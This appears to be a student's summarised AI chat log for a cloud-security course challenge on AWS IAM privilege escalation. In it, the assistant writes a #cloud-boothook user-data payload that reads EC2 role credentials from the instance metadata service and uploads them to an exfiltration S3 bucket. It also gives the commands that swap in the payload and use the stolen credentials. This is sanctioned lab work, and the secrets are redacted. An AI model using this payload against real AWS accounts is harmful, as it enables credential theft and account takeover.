\# AI Chat Log



\## Challenge



Repository: `https://github.com/humbercloudsecurity/ccgc5501-cloud-security-challenge-iam\_privesc`



Challenge: IAM Privilege Escalation by EC2 User Data Modification



Student: Aniket Sharma



Course: CCGC5501 Cloud Security



Note: AI assistance was used for guidance, troubleshooting, PowerShell command conversion, and solution write-up structure. Sensitive values such as AWS SecretAccessKey, session tokens, temporary credentials, and any full credential file contents have been redacted.



\---



\## Chat Log



\### User



Please fork and solve the following security challenge.



https://github.com/humbercloudsecurity/ccgc5501-cloud-security-challenge-iam\_privesc



Submission requirement:



Flag value

GitHub repository URL that you forked

A fully written SOLUTION.md file which contains step by step solution to the flag capturing.

A fully written SOLUTION.md file which contains reflections



NOTE: For 3 and 4, there is a sample file named SAMPLE-SOLUTION-WRITEUP.md. Use it as a reference.



NOTE: A total of 8 points will be granted based on the technical step-by-step description and answers to the reflection questions. I want to see the evidence of deep analysis and approach to the problem.



NOTE: Use of any AI solution is permitted. If you are using AI, please submit the full chat log that led to the solution of the challenge.



Guide me step by step what to do and how to do?



\---



\### Assistant



The assistant explained that this was a controlled IAM privilege escalation lab. The challenge goal was to fork the repository, deploy the Terraform environment, use the provided `dev\_user`, analyze permissions, identify the privilege escalation path through EC2 user data modification, capture the flag from the protected S3 bucket, and write `SOLUTION.md`.



The assistant gave the following high-level steps:



1\. Fork the GitHub repository.

2\. Clone the fork locally.

3\. Run Terraform init, plan, and apply.

4\. Configure the `dev\_user` profile using Terraform outputs.

5\. Confirm `dev\_user` cannot directly read the protected flag.

6\. Identify that `dev\_user` can stop/start the target EC2 instance and modify its user data.

7\. Modify EC2 user data with a `#cloud-boothook` payload.

8\. Use the payload to retrieve EC2 role credentials from Instance Metadata Service.

9\. Upload the credentials to the exfiltration S3 bucket.

10\. Download the temporary role credentials.

11\. Configure a new AWS CLI profile called `ec2\_admin`.

12\. Use `ec2\_admin` to read the protected flag.

13\. Write `SOLUTION.md` and `AI\_CHAT\_LOG.md`.

14\. Avoid committing secrets such as `role-creds.json`, `userdata.sh`, `userdata.b64`, or Terraform state files.



\---



\### User



I ran:



```powershell

aws sts get-caller-identity

```



Output:



```json

{

&#x20;   "UserId": "AIDAY2HZ6TRKJ4PM7G7AE",

&#x20;   "Account": "606114585684",

&#x20;   "Arn": "arn:aws:iam::606114585684:user/admin"

}

```



Then I ran:



```powershell

terraform init

```



But Terraform failed to install providers:



```text

Error while installing hashicorp/aws v6.52.0

could not query provider registry

failed to retrieve authentication checksums

wsarecv: An existing connection was forcibly closed by the remote host



Error while installing hashicorp/random v3.9.0

could not query provider registry

wsarecv: An existing connection was forcibly closed by the remote host

```



\---



\### Assistant



The assistant explained that AWS credentials were working correctly because `aws sts get-caller-identity` returned the admin user. The issue was with Terraform downloading providers from HashiCorp over HTTPS.



The assistant suggested:



1\. Clean failed Terraform init files:



```powershell

Remove-Item -Recurse -Force .terraform -ErrorAction SilentlyContinue

Remove-Item -Force .terraform.lock.hcl -ErrorAction SilentlyContinue

```



2\. Try Terraform init again:



```powershell

terraform init

```



3\. Test network access:



```powershell

Test-NetConnection registry.terraform.io -Port 443

Test-NetConnection releases.hashicorp.com -Port 443

```



4\. Try changing network, using mobile hotspot, turning VPN on/off, or temporarily disabling IPv6.



5\. Pin Terraform provider versions if needed by changing `main.tf` from:



```hcl

version = ">= 5.0"

```



to:



```hcl

version = "\~> 5.0"

```



for AWS provider, and:



```hcl

version = "\~> 3.6"

```



for random provider.



\---



\### User



I later ran Terraform outputs but copied Linux Bash commands into PowerShell:



```powershell

TARGET\_INSTANCE\_ID=$(terraform output -json target\_ec2\_info | jq -r '.instance\_id')

EXFIL\_BUCKET=$(terraform output -json exfil\_bucket | jq -r '.bucket\_name')

FLAG\_BUCKET=$(terraform output -raw goal | sed -E 's#.\*s3://(\[^/]+)/flag.txt.\*#\\1#')

```



PowerShell returned errors saying the terms were not recognized.



\---



\### Assistant



The assistant explained that the commands were Bash syntax and not PowerShell syntax. The assistant converted the commands to PowerShell:



```powershell

$targetInfo = terraform output -json target\_ec2\_info | ConvertFrom-Json

$exfilInfo = terraform output -json exfil\_bucket | ConvertFrom-Json

$scenarioInfo = terraform output -json scenario\_info | ConvertFrom-Json

$goal = terraform output -raw goal



$TARGET\_INSTANCE\_ID = $targetInfo.instance\_id

$EXFIL\_BUCKET = $exfilInfo.bucket\_name

$REGION = $scenarioInfo.aws\_region

$FLAG\_BUCKET = (\[regex]::Match($goal, 's3://(\[^/]+)/flag\\.txt')).Groups\[1].Value



Write-Host "Target EC2: $TARGET\_INSTANCE\_ID"

Write-Host "Exfil bucket: $EXFIL\_BUCKET"

Write-Host "Flag bucket: $FLAG\_BUCKET"

Write-Host "Region: $REGION"

```



The assistant also explained that Bash variables use:



```bash

TARGET\_INSTANCE\_ID=$(...)

```



but PowerShell variables use:



```powershell

$TARGET\_INSTANCE\_ID = ...

```



\---



\### User



I ran the PowerShell version and got:



```text

Target EC2: i-0529cfbd6865a1526

Exfil bucket: iam-privesc-ec2-wsydyp5a-exfil-bucket

Flag bucket: iam-privesc-ec2-wsydyp5a-secret-flag

Region: us-east-1

```



Then I tested direct flag access:



```powershell

aws s3 cp "s3://$FLAG\_BUCKET/flag.txt" - --profile dev\_user --region $REGION

```



Output:



```text

download failed: s3://iam-privesc-ec2-wsydyp5a-secret-flag/flag.txt to - An error occurred (403) when calling the HeadObject operation: Forbidden

```



\---



\### Assistant



The assistant confirmed that this was the expected result. It proved that `dev\_user` could not directly read the protected flag bucket.



The assistant then instructed to verify that the `dev\_user` profile was working:



```powershell

aws sts get-caller-identity --profile dev\_user --region $REGION

```



\---



\### User



I ran:



```powershell

aws sts get-caller-identity --profile dev\_user --region $REGION

```



But got:



```text

An error occurred (IncompleteSignature) when calling the GetCallerIdentity operation:

Invalid key=value pair (missing equal-sign) in Authorization header

```



\---



\### Assistant



The assistant explained that the `dev\_user` AWS profile was likely corrupted or the secret access key had been copied incorrectly.



The assistant gave commands to reset the `dev\_user` profile using Terraform outputs:



```powershell

$devCreds = terraform output -json dev\_user\_credentials | ConvertFrom-Json

$scenarioInfo = terraform output -json scenario\_info | ConvertFrom-Json

$REGION = $scenarioInfo.aws\_region



aws configure set aws\_access\_key\_id "$($devCreds.access\_key\_id)" --profile dev\_user

aws configure set aws\_secret\_access\_key "$($devCreds.secret\_access\_key)" --profile dev\_user

aws configure set region "$REGION" --profile dev\_user

aws configure set output json --profile dev\_user

```



Then test:



```powershell

aws configure list --profile dev\_user

aws sts get-caller-identity --profile dev\_user --region $REGION

```



\---



\### User



I ran:



```powershell

aws configure list --profile dev\_user

aws sts get-caller-identity --profile dev\_user --region $REGION

```



Output:



```text

NAME       : VALUE                    : TYPE             : LOCATION

profile    : dev\_user                 : manual           : --profile

access\_key : \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*YAVO     : shared-credentials-file

secret\_key : \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*oXsP     : shared-credentials-file

region     : us-east-1                : config-file      : \~/.aws/config

```



Identity output:



```json

{

&#x20;   "UserId": "AIDAY2HZ6TRKKHP5N7WJZ",

&#x20;   "Account": "606114585684",

&#x20;   "Arn": "arn:aws:iam::606114585684:user/iam-privesc-ec2-wsydyp5a-dev-user"

}

```



\---



\### Assistant



The assistant confirmed that `dev\_user` was now working.



The assistant then provided a PowerShell block to create a user data payload. The payload used `#cloud-boothook`, retrieved EC2 role credentials from the Instance Metadata Service, and uploaded them to the exfiltration S3 bucket.



The assistant provided this payload creation command:



```powershell

$userdataTemplate = @'

\#cloud-boothook

\#!/bin/bash



cat > /tmp/iam\_privesc\_payload.sh <<'PAYLOAD'

\#!/bin/bash



exec > /var/log/iam-privesc-payload.log 2>\&1

set -x



REGION="\_\_REGION\_\_"

EXFIL\_BUCKET="\_\_EXFIL\_BUCKET\_\_"



sleep 45



TOKEN=$(curl -s -m 3 -X PUT "http://169.254.169.254/latest/api/token" \\

&#x20; -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" || true)



metadata\_get() {

&#x20; PATH\_VALUE="$1"

&#x20; if \[ -n "$TOKEN" ]; then

&#x20;   curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/$PATH\_VALUE"

&#x20; else

&#x20;   curl -s "http://169.254.169.254/latest/$PATH\_VALUE"

&#x20; fi

}



for i in $(seq 1 30); do

&#x20; ROLE\_NAME=$(metadata\_get "meta-data/iam/security-credentials/")

&#x20; if \[ -n "$ROLE\_NAME" ]; then

&#x20;   break

&#x20; fi

&#x20; sleep 10

done



CREDS=$(metadata\_get "meta-data/iam/security-credentials/$ROLE\_NAME")



mkdir -p /tmp/iam-privesc

echo "$CREDS" > /tmp/iam-privesc/role-creds.json



aws s3 cp /tmp/iam-privesc/role-creds.json "s3://$EXFIL\_BUCKET/role-creds.json" --region "$REGION"

PAYLOAD



chmod +x /tmp/iam\_privesc\_payload.sh

nohup /tmp/iam\_privesc\_payload.sh >/tmp/iam-privesc-nohup.log 2>\&1 \&

'@



$userdata = $userdataTemplate.Replace("\_\_REGION\_\_", $REGION).Replace("\_\_EXFIL\_BUCKET\_\_", $EXFIL\_BUCKET)



$utf8NoBom = New-Object System.Text.UTF8Encoding($false)

\[System.IO.File]::WriteAllText("$PWD\\userdata.sh", $userdata, $utf8NoBom)



$bytes = \[System.Text.Encoding]::UTF8.GetBytes($userdata)

$b64 = \[Convert]::ToBase64String($bytes)

\[System.IO.File]::WriteAllText("$PWD\\userdata.b64", $b64, $utf8NoBom)



Write-Host "Created userdata.sh and userdata.b64"

```



The assistant then instructed to stop the EC2 instance:



```powershell

aws ec2 stop-instances `

&#x20; --instance-ids $TARGET\_INSTANCE\_ID `

&#x20; --profile dev\_user `

&#x20; --region $REGION

```



Modify the user data:



```powershell

aws ec2 modify-instance-attribute `

&#x20; --instance-id $TARGET\_INSTANCE\_ID `

&#x20; --attribute userData `

&#x20; --value file://userdata.b64 `

&#x20; --profile dev\_user `

&#x20; --region $REGION

```



Start the instance again:



```powershell

aws ec2 start-instances `

&#x20; --instance-ids $TARGET\_INSTANCE\_ID `

&#x20; --profile dev\_user `

&#x20; --region $REGION

```



Then check the exfil bucket:



```powershell

aws s3 ls "s3://$EXFIL\_BUCKET/" --profile dev\_user --region $REGION

```



\---



\### User



I ran the EC2 stop command and got:



```json

{

&#x20;   "StoppingInstances": \[

&#x20;       {

&#x20;           "InstanceId": "i-0529cfbd6865a1526",

&#x20;           "CurrentState": {

&#x20;               "Code": 64,

&#x20;               "Name": "stopping"

&#x20;           },

&#x20;           "PreviousState": {

&#x20;               "Code": 16,

&#x20;               "Name": "running"

&#x20;           }

&#x20;       }

&#x20;   ]

}

```



Then I ran the modify user data command:



```powershell

aws ec2 modify-instance-attribute `

&#x20; --instance-id $TARGET\_INSTANCE\_ID `

&#x20; --attribute userData `

&#x20; --value file://userdata.b64 `

&#x20; --profile dev\_user `

&#x20; --region $REGION

```



There was no output.



Then I started the instance:



```json

{

&#x20;   "StartingInstances": \[

&#x20;       {

&#x20;           "InstanceId": "i-0529cfbd6865a1526",

&#x20;           "CurrentState": {

&#x20;               "Code": 0,

&#x20;               "Name": "pending"

&#x20;           },

&#x20;           "PreviousState": {

&#x20;               "Code": 80,

&#x20;               "Name": "stopped"

&#x20;           }

&#x20;       }

&#x20;   ]

}

```



Then I checked the bucket but it was empty.



\---



\### Assistant



The assistant explained that the bucket was probably checked too early because the EC2 instance was still pending or the boot script had not finished.



The assistant instructed to wait until the instance was running and status checks passed:



```powershell

aws ec2 wait instance-running `

&#x20; --instance-ids $TARGET\_INSTANCE\_ID `

&#x20; --profile dev\_user `

&#x20; --region $REGION

```



Then:



```powershell

aws ec2 wait instance-status-ok `

&#x20; --instance-ids $TARGET\_INSTANCE\_ID `

&#x20; --profile dev\_user `

&#x20; --region $REGION

```



Then check the exfil bucket again:



```powershell

aws s3 ls "s3://$EXFIL\_BUCKET/" --profile dev\_user --region $REGION

```



The assistant also suggested a repeated check loop:



```powershell

for ($i = 1; $i -le 10; $i++) {

&#x20;   Write-Host "Check attempt $i..."

&#x20;   aws s3 ls "s3://$EXFIL\_BUCKET/" --profile dev\_user --region $REGION

&#x20;   Start-Sleep -Seconds 30

}

```



\---



\### User



I checked the exfil bucket and got:



```text

2026-06-28 06:53:15       1591 role-creds.json

```



Then I downloaded the file:



```powershell

aws s3 cp "s3://$EXFIL\_BUCKET/role-creds.json" ".\\role-creds.json" --profile dev\_user --region $REGION

Get-Content .\\role-creds.json

```



The file contained temporary AWS credentials. Sensitive fields were displayed, including `AccessKeyId`, `SecretAccessKey`, and `Token`.



\---



\### Assistant



The assistant warned not to commit `role-creds.json` to GitHub because it contained live temporary AWS credentials.



The assistant then gave commands to configure the privileged EC2 role profile:



```powershell

$roleCreds = Get-Content .\\role-creds.json | ConvertFrom-Json



aws configure set aws\_access\_key\_id "$($roleCreds.AccessKeyId)" --profile ec2\_admin

aws configure set aws\_secret\_access\_key "$($roleCreds.SecretAccessKey)" --profile ec2\_admin

aws configure set aws\_session\_token "$($roleCreds.Token)" --profile ec2\_admin

aws configure set region "$REGION" --profile ec2\_admin

aws configure set output json --profile ec2\_admin

```



Then verify the new identity:



```powershell

aws sts get-caller-identity --profile ec2\_admin --region $REGION

```



Then capture the flag:



```powershell

aws s3 cp "s3://$FLAG\_BUCKET/flag.txt" - --profile ec2\_admin --region $REGION

```



The assistant reminded the user not to paste secret keys or session tokens again.



\---



\### User



I asked what screenshots I needed to take.



\---



\### Assistant



The assistant recommended screenshots for evidence:



1\. Admin AWS identity before deployment.

2\. Terraform apply completed or Terraform output.

3\. `dev\_user` identity.

4\. Direct flag access denied with `403 Forbidden`.

5\. EC2 stop, modify user data, and start commands.

6\. Exfil bucket showing `role-creds.json`.

7\. Download success for `role-creds.json`, but not the full file contents.

8\. `ec2\_admin` assumed-role identity.

9\. Final flag capture.

10\. GitHub repo showing `SOLUTION.md`.



The assistant warned not to show:



```text

SecretAccessKey

Session Token

Full role-creds.json content

terraform.tfstate

```



\---



\### User



I asked what to do next after all screenshots and flag capture were done.



\---



\### Assistant



The assistant explained the final submission process:



1\. Create `.gitignore`.

2\. Do not commit secret files.

3\. Create `SOLUTION.md`.

4\. Create `AI\_CHAT\_LOG.md`.

5\. Commit and push to GitHub.

6\. Submit the flag, GitHub repo URL, and evidence Word document.

7\. Destroy Terraform resources only after submission.



The assistant suggested `.gitignore` content:



```text

.terraform/

terraform.tfstate

terraform.tfstate.\*

\*.tfvars

start.txt

userdata.sh

userdata.b64

role-creds.json

\*.pem

```



The assistant suggested:



```powershell

git add SOLUTION.md AI\_CHAT\_LOG.md .gitignore

git commit -m "Add IAM privilege escalation solution"

git push origin main

```



\---



\### User



I asked whether I was submitting a Word document with screenshots.



\---



\### Assistant



The assistant clarified that the Word document with screenshots was acceptable as extra evidence, but the assignment specifically required a GitHub repository URL and a `SOLUTION.md`.



The assistant recommended submitting:



```text

Flag value: CG{YOUR\_FINAL\_FLAG\_HERE}



GitHub repo URL:

https://github.com/YOUR\_USERNAME/ccgc5501-cloud-security-challenge-iam\_privesc



Attached files:

\- IAM\_PrivEsc\_Evidence\_Aniket.docx

\- AI\_CHAT\_LOG.md if not already in repo

```



The assistant explained that `SOLUTION.md` should contain the full written steps and reflection, while the Word document can contain screenshots.



\---



\### User



I asked what screenshots I needed to add in `SOLUTION.md`.



\---



\### Assistant



The assistant explained that screenshots can be referenced in Markdown if added to a `screenshots` folder.



Recommended screenshot files:



```text

screenshots/01-dev-user.png

screenshots/02-access-denied.png

screenshots/03-ec2-stop-modify-start.png

screenshots/04-exfil-bucket.png

screenshots/05-ec2-admin-role.png

screenshots/06-flag.png

```



Markdown syntax:



```markdown

!\[dev\_user identity](screenshots/01-dev-user.png)

```



The assistant also explained that if screenshots could not be added to `SOLUTION.md`, the solution could mention that screenshots were included separately in a Word document.



\---



\### User



I said I was unable to add screenshots in `SOLUTION.md`.



\---



\### Assistant



The assistant said that it was okay to keep screenshots in the Word document and mention them in `SOLUTION.md`:



```markdown

\## Evidence



Screenshots are included in the submitted Word document named:



`IAM\_PrivEsc\_Evidence\_Aniket.docx`



The Word document contains:

1\. dev\_user identity

2\. 403 Forbidden direct flag access

3\. EC2 stop/modify/start commands

4\. Exfil bucket showing role-creds.json

5\. ec2\_admin assumed role identity

6\. Final flag output

```



\---



\### User



I asked for a proper `SOLUTION.md`.



\---



\### Assistant



The assistant provided a full `SOLUTION.md` with the following sections:



1\. Submission Information

2\. Challenge Objective

3\. Environment Information

4\. Initial AWS Identity Verification

5\. Terraform Initialization and Deployment

6\. Configuring `dev\_user`

7\. Confirming Direct Flag Access Was Denied

8\. Permission Analysis and Privilege Escalation Path

9\. Creating the User Data Payload

10\. Stopping the EC2 Instance

11\. Modifying EC2 User Data

12\. Starting the EC2 Instance

13\. Confirming Credential Exfiltration

14\. Configuring the Privileged EC2 Role Profile

15\. Capturing the Flag

16\. Evidence Screenshots

17\. Reflections

18\. Cleanup

19\. AI Usage Statement



The assistant instructed to replace placeholders:



```text

YOUR\_GITHUB\_REPO\_URL\_HERE

YOUR\_FINAL\_FLAG\_HERE

YOUR\_EC2\_ADMIN\_ASSUMED\_ROLE\_ARN\_HERE

```



\---



\### User



I said everything was done and asked what to do next.



\---



\### Assistant



The assistant gave the final checklist:



1\. Run:



```powershell

git status

```



2\. Confirm GitHub contains:



```text

SOLUTION.md

AI\_CHAT\_LOG.md

.gitignore

```



3\. Make sure GitHub does not contain:



```text

role-creds.json

userdata.sh

userdata.b64

terraform.tfstate

terraform.tfstate.backup

.terraform/

```



4\. Submit:



```text

Flag value: CG{YOUR\_FINAL\_FLAG\_HERE}



Forked GitHub repository URL:

https://github.com/YOUR\_USERNAME/ccgc5501-cloud-security-challenge-iam\_privesc



Attached:

IAM\_PrivEsc\_Evidence\_Aniket.docx

```



5\. After submission, destroy resources:



```powershell

terraform destroy -auto-approve

```



\---



\## Final Sensitive Data Redaction Note



During the challenge, temporary AWS credentials were retrieved from the EC2 Instance Metadata Service and saved in `role-creds.json`. The file contained:



```text

AccessKeyId

SecretAccessKey

Token

Expiration

```



For safety, the full credential values are not included in this AI chat log. The file `role-creds.json` was not committed to GitHub and was added to `.gitignore`.



\---



\## Final Flag



```text

YOUR\_FINAL\_FLAG\_HERE

```



\---



\## Files Prepared for Submission



The following files were prepared:



```text

SOLUTION.md

AI\_CHAT\_LOG.md

.gitignore

IAM\_PrivEsc\_Evidence\_Aniket.docx

```



The GitHub repository contains the written solution and AI chat log. Screenshots are included in the Word document evidence file.



